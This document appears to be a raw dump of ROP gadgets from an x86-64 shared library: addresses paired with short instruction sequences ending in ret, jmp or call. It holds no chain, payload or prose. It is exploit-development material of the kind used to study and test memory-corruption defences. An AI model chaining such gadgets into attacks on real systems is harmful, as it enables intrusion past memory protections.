0x00002aaaaab7a35a : jg 0xa536c ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7a37e : jg 0xa5391 ; mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7a39d : jg 0xa53af ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7a3bd : jg 0xa53cf ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7a3db : jg 0xa53eb ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7a3fb : jg 0xa540b ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7a41b : jg 0xa542b ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7a43b : jg 0xa544b ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7a9c8 : jg 0xa59d3 ; jne 0xa6288 ; ret
0x00002aaaaab7a9ec : jg 0xa59f8 ; jne 0xa6288 ; ret
0x00002aaaaab7aa0f : jg 0xa5a1c ; jne 0xa6288 ; ret
0x00002aaaaab7aa2a : jg 0xa5a38 ; jne 0xa6288 ; ret
0x00002aaaaab7aa4d : jg 0xa5a5c ; jne 0xa6288 ; ret
0x00002aaaaab7aa72 : jg 0xa5a82 ; jne 0xa6288 ; ret
0x00002aaaaab7aa90 : jg 0xa5aa1 ; jne 0xa6288 ; ret
0x00002aaaaab7aaac : jg 0xa5abe ; jne 0xa6288 ; ret
0x00002aaaaab7aacf : jg 0xa5ae2 ; jne 0xa6288 ; ret
0x00002aaaaab7aaf4 : jg 0xa5b08 ; jne 0xa6288 ; ret
0x00002aaaaab7ab12 : jg 0xa5b27 ; jne 0xa6288 ; ret
0x00002aaaaab7ab32 : jg 0xa5b48 ; jne 0xa6288 ; ret
0x00002aaaaab7ab54 : jg 0xa5b6b ; jne 0xa6288 ; ret
0x00002aaaaab7ab74 : jg 0xa5b8c ; jne 0xa6288 ; ret
0x00002aaaaab7ab94 : jg 0xa5bad ; jne 0xa6288 ; ret
0x00002aaaaab7abae : jg 0xa5bc8 ; jne 0xa6288 ; ret
0x00002aaaaab7abd1 : jg 0xa5bec ; jne 0xa6288 ; ret
0x00002aaaaab7abf6 : jg 0xa5c12 ; jne 0xa6288 ; ret
0x00002aaaaab7ac14 : jg 0xa5c31 ; jne 0xa6288 ; ret
0x00002aaaaab7ac34 : jg 0xa5c52 ; jne 0xa6288 ; ret
0x00002aaaaab7ac57 : jg 0xa5c76 ; jne 0xa6288 ; ret
0x00002aaaaab7ac76 : jg 0xa5c96 ; jne 0xa6288 ; ret
0x00002aaaaab7ac96 : jg 0xa5cb7 ; jne 0xa6288 ; ret
0x00002aaaaab7acb6 : jg 0xa5cd8 ; jne 0xa6288 ; ret
0x00002aaaaab7acd9 : jg 0xa5cfc ; jne 0xa6288 ; ret
0x00002aaaaab7ad0e : jg 0xa5d32 ; jne 0xa6288 ; ret
0x00002aaaaab7ad3c : jg 0xa5d61 ; jne 0xa6288 ; ret
0x00002aaaaab7ad6c : jg 0xa5d92 ; jne 0xa6288 ; ret
0x00002aaaaab7ad98 : jg 0xa5dbf ; jne 0xa6288 ; ret
0x00002aaaaab7adc8 : jg 0xa5df0 ; jne 0xa6288 ; ret
0x00002aaaaab7adf8 : jg 0xa5e21 ; jne 0xa6288 ; ret
0x00002aaaaab7ae28 : jg 0xa5e52 ; jne 0xa6288 ; ret
0x00002aaaaab7af46 : jg 0xa5f51 ; ret
0x00002aaaaab7af59 : jg 0xa5f67 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7af6a : jg 0xa5f79 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7af89 : jg 0xa5f97 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7af99 : jg 0xa5fa7 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7afac : jg 0xa5fbd ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaab7afca : jg 0xa5fd9 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7afea : jg 0xa5ff9 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7b00a : jg 0xa6019 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7b02d : jg 0xa603f ; mov qword ptr [rdi + 0x10], rdx ; mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7b04e : jg 0xa6061 ; mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7b06d : jg 0xa607f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7b08d : jg 0xa609f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7b0ab : jg 0xa60bb ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7b0cb : jg 0xa60db ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7b0eb : jg 0xa60fb ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7b10b : jg 0xa611b ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7b12e : jg 0xa6141 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7b242 : jg 0xa624d ; ret
0x00002aaaaab7b376 : jg 0xa63aa ; ret
0x00002aaaaab7b8e6 : jg 0xa68f5 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7b8f6 : jg 0xa6908 ; mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b90a : jg 0xa691d ; mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7b929 : jg 0xa693b ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7b949 : jg 0xa695b ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7b98a : jg 0xa699d ; mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7b9aa : jg 0xa69bd ; mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7b9ca : jg 0xa69dd ; mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7ba6b : jg 0xa6a7f ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7ba8b : jg 0xa6a9f ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7baab : jg 0xa6abf ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7ba6f : jg 0xa6acf ; or eax, 0x1c478d48 ; ret
0x00002aaaaab7bacb : jg 0xa6adf ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c06b : jg 0xa7076 ; jne 0xa7a98 ; ret
0x00002aaaaab7c090 : jg 0xa709c ; jne 0xa7a98 ; ret
0x00002aaaaab7c0b3 : jg 0xa70c0 ; jne 0xa7a98 ; ret
0x00002aaaaab7c0ce : jg 0xa70dc ; jne 0xa7a98 ; ret
0x00002aaaaab7c0f1 : jg 0xa7100 ; jne 0xa7a98 ; ret
0x00002aaaaab7c116 : jg 0xa7126 ; jne 0xa7a98 ; ret
0x00002aaaaab7c134 : jg 0xa7145 ; jne 0xa7a98 ; ret
0x00002aaaaab7c150 : jg 0xa7162 ; jne 0xa7a98 ; ret
0x00002aaaaab7c173 : jg 0xa7186 ; jne 0xa7a98 ; ret
0x00002aaaaab7c198 : jg 0xa71ac ; jne 0xa7a98 ; ret
0x00002aaaaab7c1c6 : jg 0xa71db ; jne 0xa7a98 ; ret
0x00002aaaaab7c1e6 : jg 0xa71fc ; jne 0xa7a98 ; ret
0x00002aaaaab7c208 : jg 0xa721f ; jne 0xa7a98 ; ret
0x00002aaaaab7c238 : jg 0xa7250 ; jne 0xa7a98 ; ret
0x00002aaaaab7c268 : jg 0xa7281 ; jne 0xa7a98 ; ret
0x00002aaaaab7c292 : jg 0xa72ac ; jne 0xa7a98 ; ret
0x00002aaaaab7c2b5 : jg 0xa72d0 ; jne 0xa7a98 ; ret
0x00002aaaaab7c2da : jg 0xa72f6 ; jne 0xa7a98 ; ret
0x00002aaaaab7c308 : jg 0xa7325 ; jne 0xa7a98 ; ret
0x00002aaaaab7c338 : jg 0xa7356 ; jne 0xa7a98 ; ret
0x00002aaaaab7c36b : jg 0xa738a ; jne 0xa7a98 ; ret
0x00002aaaaab7c39a : jg 0xa73ba ; jne 0xa7a98 ; ret
0x00002aaaaab7c3ca : jg 0xa73eb ; jne 0xa7a98 ; ret
0x00002aaaaab7c3fa : jg 0xa741c ; jne 0xa7a98 ; ret
0x00002aaaaab7c42d : jg 0xa7450 ; jne 0xa7a98 ; ret
0x00002aaaaab7c462 : jg 0xa7486 ; jne 0xa7a98 ; ret
0x00002aaaaab7c490 : jg 0xa74b5 ; jne 0xa7a98 ; ret
0x00002aaaaab7c4c0 : jg 0xa74e6 ; jne 0xa7a98 ; ret
0x00002aaaaab7c4ec : jg 0xa7513 ; jne 0xa7a98 ; ret
0x00002aaaaab7c51c : jg 0xa7544 ; jne 0xa7a98 ; ret
0x00002aaaaab7c54c : jg 0xa7575 ; jne 0xa7a98 ; ret
0x00002aaaaab7c57c : jg 0xa75a6 ; jne 0xa7a98 ; ret
0x00002aaaaab7c726 : jg 0xa7735 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7c739 : jg 0xa774b ; mov byte ptr [rdi + 0x10], cl ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7c75a : jg 0xa776d ; mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7c779 : jg 0xa778b ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7c799 : jg 0xa77ab ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7c7da : jg 0xa77ed ; mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7c7fa : jg 0xa780d ; mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7c81a : jg 0xa782d ; mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7c8bb : jg 0xa78cf ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7c8db : jg 0xa78ef ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7c8fb : jg 0xa790f ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c8bf : jg 0xa791f ; or eax, 0x1d478d48 ; ret
0x00002aaaaab7c91b : jg 0xa792f ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab7c93e : jg 0xa7951 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7ca52 : jg 0xa7a5d ; ret
0x00002aaaaab7cb86 : jg 0xa7bbe ; lea rax, qword ptr [rdi + 0x40] ; ret
0x00002aaaaab7cb85 : jg 0xa7c0d ; xor byte ptr [rax - 0x73], cl ; ret
0x00002aaaaab7d356 : jg 0xa8361 ; ret
0x00002aaaaab7d366 : jg 0xa8374 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7d37a : jg 0xa8389 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7d399 : jg 0xa83a7 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7d3a9 : jg 0xa83b7 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7d3b9 : jg 0xa83ca ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7d3da : jg 0xa83e9 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7d3fa : jg 0xa8409 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7d41a : jg 0xa8429 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7d43a : jg 0xa844c ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7d45e : jg 0xa8471 ; mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7d47d : jg 0xa848f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7d49d : jg 0xa84af ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7d4bb : jg 0xa84cb ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7d4db : jg 0xa84eb ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7d4fb : jg 0xa850b ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7d51b : jg 0xa852b ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7de26 : jg 0xa8e31 ; ret
0x00002aaaaab7de36 : jg 0xa8e44 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7de4a : jg 0xa8e59 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7de69 : jg 0xa8e77 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7de79 : jg 0xa8e87 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7de89 : jg 0xa8e9a ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7deaa : jg 0xa8eb9 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7deca : jg 0xa8ed9 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7deea : jg 0xa8ef9 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7df0a : jg 0xa8f1c ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7df2e : jg 0xa8f41 ; mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7df4d : jg 0xa8f5f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7df6d : jg 0xa8f7f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7df8b : jg 0xa8f9b ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7dfab : jg 0xa8fbb ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7dfcb : jg 0xa8fdb ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7dfeb : jg 0xa8ffb ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7e196 : jg 0xa91a6 ; xor ch, ch ; mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaab7e1a9 : jg 0xa91bc ; mov byte ptr [rdi + 0x10], cl ; xor ch, ch ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1ca : jg 0xa91de ; mov word ptr [rdi + 0x10], cx ; xor ch, ch ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e1e9 : jg 0xa91fc ; mov dword ptr [rdi + 0xf], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e209 : jg 0xa921c ; mov dword ptr [rdi + 0x10], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e24a : jg 0xa925e ; mov qword ptr [rdi + 0xe], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7e26a : jg 0xa927e ; mov qword ptr [rdi + 0xf], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaab7e28a : jg 0xa929e ; mov qword ptr [rdi + 0x10], rcx ; xor ch, ch ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7e36f : jg 0xa93d0 ; wrmsr ; in eax, dx ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaab7e38f : jg 0xa93f0 ; adc byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7e3b2 : jg 0xa9416 ; adc byte ptr [rax - 0x12cfdfb1], cl ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e406 : jg 0xa943f ; xor ch, ch ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab7e405 : jg 0xa948e ; xor byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab7ea27 : jg 0xa9a37 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaab7ea1d : jg 0xa9a3d ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00002aaaaab7eff0 : jg 0xaa02d ; ret 0x2b77
0x00002aaaaab800b5 : jg 0xab0bd ; neg eax ; ret
0x00002aaaaab805c8 : jg 0xab5c7 ; setl al ; movzx eax, al ; neg eax ; ret
0x00002aaaaab8fb3d : jg 0xbab6b ; mov rax, rbx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9bcd7 : jg 0xc6caa ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaaba1dac : jg 0xccdb2 ; add byte ptr [rax], al ; ret
0x00002aaaaaba1dfb : jg 0xcce04 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00002aaaaaba1dfb : jg 0xcce05 ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00002aaaaabab64d : jg 0xd66be ; add dword ptr [rcx], ebx ; sal bh, 0xd0 ; and eax, 2 ; ret
0x00002aaaaabb6417 : jg 0xe142c ; add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaabb6417 : jg 0xe142d ; add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaabd47ef : jg 0xff7f9 ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x89 ; ret 0xfffe
0x00002aaaaabd6dab : jge 0x101daf ; call rbx
0x00002aaaaabd6ed2 : jge 0x101ed6 ; call rbx
0x00002aaaaabd6ee0 : jge 0x101ee4 ; call rbx
0x00002aaaaabd7015 : jge 0x102019 ; call rbx
0x00002aaaaabd7185 : jge 0x102189 ; call rbx
0x00002aaaaabd7193 : jge 0x102197 ; call rbx
0x00002aaaaabd75e6 : jge 0x1025b1 ; mov r13d, ebx ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaabd89a3 : jge 0x1039a7 ; call rbx
0x00002aaaaabd8acb : jge 0x103acf ; call rbx
0x00002aaaaabd8c0e : jge 0x103c12 ; call rbx
0x00002aaaaabd8d0f : jge 0x103d13 ; call rbx
0x00002aaaaabd8d2b : jge 0x103d2f ; call rbx
0x00002aaaaac0723f : jge 0x132253 ; call rax
0x00002aaaaac0865a : jge 0x133685 ; test rdi, rdi ; je 0x133677 ; call 0x1f8b1
0x00002aaaaac0d3bf : jge 0x1383d3 ; call rax
0x00002aaaaac0dad8 : jge 0x138aec ; call rax
0x00002aaaaac32a0d : jge 0x15da1d ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac46f80 : jge 0x171f95 ; call r12
0x00002aaaaac485fc : jge 0x173602 ; call 0x1f8ac
0x00002aaaaac485eb : jge 0x173611 ; call 0x1f8ac
0x00002aaaaac485e2 : jge 0x173658 ; call 0x1f8ac
0x00002aaaaac5cb05 : jge 0x187afc ; jmp rdx
0x00002aaaaac5cb91 : jge 0x187b90 ; push qword ptr [rax + 0x6dfff381] ; jl 0x187b98 ; jmp rdx
0x00002aaaaac5e410 : jge 0x1893ab ; cmc ; jmp qword ptr [rbx]
0x00002aaaaac6936d : jge 0x19436c ; jmp qword ptr [rax]
0x00002aaaaac6a2a1 : jge 0x1952a1 ; call rax
0x00002aaaaac6a31d : jge 0x19531d ; jmp qword ptr [rdx]
0x00002aaaaac6a321 : jge 0x195325 ; jmp qword ptr [rdx + 0x22fffc7c]
0x00002aaaaac6a49d : jge 0x19549d ; jmp rax
0x00002aaaaac723c9 : jge 0x19d3b6 ; call qword ptr [rax]
0x00002aaaaac77cad : jge 0x1a2cb5 ; add al, dh ; in eax, dx ; jmp rsi
0x00002aaaaac789a9 : jge 0x1a399a ; call qword ptr [rsi]
0x00002aaaaab0df6e : jge 0x38f73 ; call r14
0x00002aaaaab1553f : jge 0x4057d ; adc eax, 0xc1834900 ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaab1c27a : jge 0x47281 ; cmp cl, byte ptr [rdi] ; xchg eax, esp ; ret
0x00002aaaaab5413d : jge 0x7f13f ; dec dword ptr [rax - 0x7d] ; ret 0x4007
0x00002aaaaab734df : jge 0x9e4e7 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab80f56 : jge 0xabf5b ; call r12
0x00002aaaaab80ffb : jge 0xac008 ; lea r9, qword ptr [rsp + 0x28] ; lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaaba142f : jge 0xcc3e1 ; call 0x1f8b0
0x00002aaaaababa9a : jge 0xd6a73 ; mov edx, eax ; jmp 0xd6a7c
0x00002aaaaabcbc62 : jge 0xf6cb4 ; add esp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd3e6f : jge 0xfeeeb ; sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaabd7240 : jl 0x10226e ; adc byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00002aaaaabdb7f4 : jl 0x106839 ; je 0x1067fd ; ret
0x00002aaaaabdd9c0 : jl 0x108971 ; sub eax, dword ptr [rax] ; je 0x1089cf ; pop rbp ; ret
0x00002aaaaabed79b : jl 0x1187ca ; or bl, ch ; scasd eax, dword ptr [rdi] ; mov eax, edi ; bswap eax ; ret
0x00002aaaaabfbb3a : jl 0x126b04 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabfbbe6 : jl 0x126bae ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabfca79 : jl 0x127aa4 ; and byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac07b07 : jl 0x132b32 ; or byte ptr [rax + 0x63], cl ; ret
0x00002aaaaac0ebf0 : jl 0x139c54 ; out dx, al ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac3288f : jl 0x15d89f ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac32b4a : jl 0x15db5a ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac44c9b : jl 0x16fca4 ; neg eax ; ret
0x00002aaaaac5cb48 : jl 0x187ad1 ; jmp rdx
0x00002aaaaac5cb99 : jl 0x187b90 ; jmp rdx
0x00002aaaaac5cbb1 : jl 0x187bac ; lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaac5ec15 : jl 0x189c0f ; jmp rdx
0x00002aaaaac5ec19 : jl 0x189c13 ; jmp rdx
0x00002aaaaac5ec1d : jl 0x189c17 ; jmp rdx
0x00002aaaaac5ec21 : jl 0x189c1b ; jmp rdx
0x00002aaaaac5ec25 : jl 0x189c27 ; inc dword ptr [rsi] ; xor esi, 0xf67ce2ff ; jmp rax
0x00002aaaaac5ec2d : jl 0x189c27 ; jmp rax
0x00002aaaaac5ec35 : jl 0x189c2f ; jmp rdx
0x00002aaaaac5ec39 : jl 0x189c33 ; jmp rdx
0x00002aaaaac5ec3d : jl 0x189c37 ; jmp rdx
0x00002aaaaac5ec41 : jl 0x189c3b ; jmp rdx
0x00002aaaaac5ec45 : jl 0x189c3f ; jmp rdx
0x00002aaaaac5ec49 : jl 0x189c43 ; jmp rdx
0x00002aaaaac5ec4d : jl 0x189c47 ; jmp rdx
0x00002aaaaac5ec51 : jl 0x189c4b ; jmp rdx
0x00002aaaaac5ec55 : jl 0x189c4f ; jmp rdx
0x00002aaaaac5ec59 : jl 0x189c53 ; jmp rdx
0x00002aaaaac5ec5d : jl 0x189c57 ; jmp rdx
0x00002aaaaac5ec61 : jl 0x189c5b ; jmp rdx
0x00002aaaaac5ec65 : jl 0x189c5f ; jmp rdx
0x00002aaaaac5ec69 : jl 0x189c63 ; jmp rdx
0x00002aaaaac5ec6d : jl 0x189c6b ; lcall ptr [rsi + rdi*2 - 0xa] ; jmp rdx
0x00002aaaaac5ec75 : jl 0x189c73 ; dec dword ptr [rsi + rdi*2 - 0xa] ; jmp rdx
0x00002aaaaac5ec7d : jl 0x189c77 ; jmp rdx
0x00002aaaaac5ec81 : jl 0x189c7b ; jmp rdx
0x00002aaaaac5ec85 : jl 0x189c7f ; jmp rdx
0x00002aaaaac5ec89 : jl 0x189c83 ; jmp rdx
0x00002aaaaac5ec8d : jl 0x189c87 ; jmp rdx
0x00002aaaaac5ec91 : jl 0x189c8b ; jmp rdx
0x00002aaaaac5ec95 : jl 0x189c8f ; jmp rdx
0x00002aaaaac5ec99 : jl 0x189c93 ; jmp rdx
0x00002aaaaac5ec9d : jl 0x189c97 ; jmp rdx
0x00002aaaaac5eca1 : jl 0x189c9b ; jmp rdx
0x00002aaaaac5eca5 : jl 0x189c9f ; jmp rdx
0x00002aaaaac5ecb1 : jl 0x189cab ; jmp rdx
0x00002aaaaac5ecb5 : jl 0x189caf ; jmp rdx
0x00002aaaaac5ecb9 : jl 0x189cb3 ; jmp rdx
0x00002aaaaac5ecbd : jl 0x189cb7 ; jmp rdx
0x00002aaaaac5ecc1 : jl 0x189cc3 ; ljmp ptr [rbx + 0x7a] ; idiv bh ; scasb al, byte ptr [rdi] ; jns 0x189ccb ; jmp qword ptr [rdx]
0x00002aaaaac5ecd5 : jl 0x189ccf ; jmp qword ptr [rdx]
0x00002aaaaac5eccd : jl 0x189ccf ; ljmp ptr [rsi + 0x22fff679] ; jl 0x189cd7 ; jmp qword ptr [rdx]
0x00002aaaaac5ecd9 : jl 0x189cd3 ; jmp qword ptr [rdx]
0x00002aaaaac5ecdd : jl 0x189cd7 ; jmp qword ptr [rdx]
0x00002aaaaac5ece1 : jl 0x189cdb ; jmp qword ptr [rdx]
0x00002aaaaac5ecf5 : jl 0x189cef ; jmp qword ptr [rdx]
0x00002aaaaac5eced : jl 0x189cef ; ljmp ptr [rax + 0x22fff67a] ; jl 0x189cf7 ; jmp qword ptr [rdx]
0x00002aaaaac5ecf9 : jl 0x189cf3 ; jmp qword ptr [rdx]
0x00002aaaaac5ecfd : jl 0x189cf7 ; jmp qword ptr [rdx]
0x00002aaaaac5ed01 : jl 0x189cfb ; jmp qword ptr [rdx]
0x00002aaaaac5ed05 : jl 0x189cff ; jmp qword ptr [rdx]
0x00002aaaaac5ed09 : jl 0x189d03 ; jmp qword ptr [rdx]
0x00002aaaaac5ed0d : jl 0x189d07 ; jmp qword ptr [rdx]
0x00002aaaaac5ed11 : jl 0x189d0b ; jmp qword ptr [rdx]
0x00002aaaaac5ed15 : jl 0x189d0f ; jmp qword ptr [rdx]
0x00002aaaaac5ed19 : jl 0x189d13 ; jmp qword ptr [rdx]
0x00002aaaaac5ed1d : jl 0x189d17 ; jmp qword ptr [rdx]
0x00002aaaaac5ed21 : jl 0x189d1b ; jmp qword ptr [rdx]
0x00002aaaaac5ed25 : jl 0x189d1f ; jmp qword ptr [rdx]
0x00002aaaaac5ed29 : jl 0x189d23 ; jmp qword ptr [rdx]
0x00002aaaaac5ed3d : jl 0x189d37 ; jmp qword ptr [rdx]
0x00002aaaaac5ed41 : jl 0x189d3b ; jmp qword ptr [rdx]
0x00002aaaaac5ed45 : jl 0x189d3f ; jmp qword ptr [rdx]
0x00002aaaaac5ed49 : jl 0x189d43 ; jmp qword ptr [rdx]
0x00002aaaaac5ed4d : jl 0x189d47 ; jmp qword ptr [rdx]
0x00002aaaaac5ed51 : jl 0x189d4b ; jmp qword ptr [rdx]
